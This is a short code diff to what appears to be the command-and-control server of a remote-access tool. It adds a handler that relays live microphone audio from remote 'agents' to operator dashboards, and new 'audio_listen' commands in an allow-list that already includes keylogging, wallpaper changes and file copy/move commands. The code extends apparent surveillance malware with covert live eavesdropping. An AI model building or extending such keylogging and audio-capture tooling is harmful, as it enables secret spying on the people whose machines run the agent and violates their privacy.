@@ -210,6 +210,13 @@ async def ws_agent(ws: WebSocket):
                     pass
                 # Optionally notify dashboards
                 await manager.relay_output_to_dashboards(agent_id, '[audio saved]\n')
+            elif data.get('type') == 'audio_live':
+                # Relay live audio chunks to dashboards (not persisted)
+                try:
+                    payload = {k: data[k] for k in ('pcm_b64','rate','ch','ts') if k in data}
+                except Exception:
+                    payload = {"pcm_b64": str(data.get('pcm_b64') or data.get('data') or '')}
+                await manager.relay_audio_live_to_dashboards(agent_id, payload)
             elif 'error' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
@@ -257,7 +264,8 @@ async def ws_dashboard(ws: WebSocket):
                 'keylog_start','keylog_stop','wallpaper_set','fs_copy','fs_move',
                 'masters_list','masters_add','masters_update','masters_delete','masters_reconnect',
                 # audio control & intercom
-                'audio_start','audio_stop','audio_play_path','audio_play_data',
+'audio_start','audio_stop','audio_play_path','audio_play_data',
+                'audio_listen_start','audio_listen_stop',
                 'intercom_start','intercom_chunk','intercom_stop','intercom_mute'
             ):
                 ok = await manager.forward_json(target, data)
